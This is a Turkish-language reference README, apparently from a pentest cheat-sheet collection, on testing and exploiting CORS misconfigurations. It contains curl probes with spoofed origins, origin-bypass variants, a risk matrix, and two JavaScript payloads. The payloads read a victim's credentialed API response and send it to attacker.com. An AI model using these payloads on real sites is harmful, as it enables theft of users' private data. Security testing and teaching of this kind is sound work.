# 🌍 CORS Hatalı Yapılandırması Başvuru Kılavuzu

[🇬🇧 English](../../README.md) • [🇮🇹 Versione Italiana](README.it.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Cross-Origin Resource Sharing
```

---

## 🎯 CORS Nedir?

**CORS (Cross-Origin Resource Sharing - Çapraz Kaynak Paylaşımı)**, web tarayıcılarının bir web kaynağından başka bir web kaynağına yapılan istekleri kısıtlayan Aynı Köken İlkesi'ni (Same-Origin Policy - SOP) esnetmesini sağlayan HTTP başlıkları mekanizmasıdır. Hatalı yapılandırılmış CORS ilkeleri, saldırganların kurbanın oturumu üzerinden hassas verileri çalmasına yol açar.

---

## 🔍 CORS Testi Nasıl Yapılır?

### Temel Test (cURL)
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Dönen yanıt başlıklarını inceleyin:
Access-Control-Allow-Origin: https://evil.com  # Zafiyet adayı!
Access-Control-Allow-Credentials: true         # KRİTİK SEVİYE! (Oturum çerezleri aktarılabilir)
```

### Test Edilecek Başlık Değerleri (Origin Varyasyonları)
```
# Doğrudan saldırgan etki alanı:
https://evil.com

# Ön ek / son ek atlatmaları:
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Null origin (sandbox iframe veya yerel dosyalardan gelen istekler):
null

# Güvenilen alt alan adları (Subdomain Takeover veya XSS riski varsa):
https://sub.target.com

# Protokol düşürme (HTTPS -> HTTP):
http://target.com
```

---

## 💉 İstismar (Exploitation)

### Kimlik Bilgileriyle Veri Çalma (CSRF + Veri Sızıntısı)
Saldırgan kendi sitesinde kurbanı ziyaret ettirir; kurbanın çerezleriyle hedef API'ye istek atılır ve dönen JSON verisi saldırganın sunucusuna aktarılır:

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true; // Kurbanın oturum çerezlerini içerir
xhr.onload = function() {
    // Çalınan veriyi saldırganın sunucusuna gönder
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Modern Fetch API ile İstismar
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

## 📊 Zafiyet ve Risk Matrisi

| ACAO (Allow-Origin) | ACAC (Allow-Credentials) | Risk Seviyesi |
|---------------------|--------------------------|---------------|
| `*` | false | Düşük (Genel içerik, çerez yok) |
| `*` | true | Geçersiz yapılandırma (Tarayıcı engeller) |
| Saldırgan Origin | true | **KRİTİK (CRITICAL)** |
| `null` | true | **YÜKSEK (HIGH)** |
| Yansıtılan (Reflected) Origin | true | **KRİTİK (CRITICAL)** |

### En Tehlikeli Yapılandırma Kalıpları
```http
# Gelen her Origin değerini yansıtma:
Access-Control-Allow-Origin: [istekten gelen origin]
Access-Control-Allow-Credentials: true

# "null" değerine izin verme:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ Hızlı Otomasyon

```bash
# Tek satırlık cURL döngüsü ile test:
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Denenen Origin: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

<p align="center">
  <b>🌍 CORS Yapılandırmalarını Doğru Yönetin, Verilerinizi Koruyun!</b><br>
  <i>Yalnızca izin verilen sistemlerde test yapınız.</i>
</p>
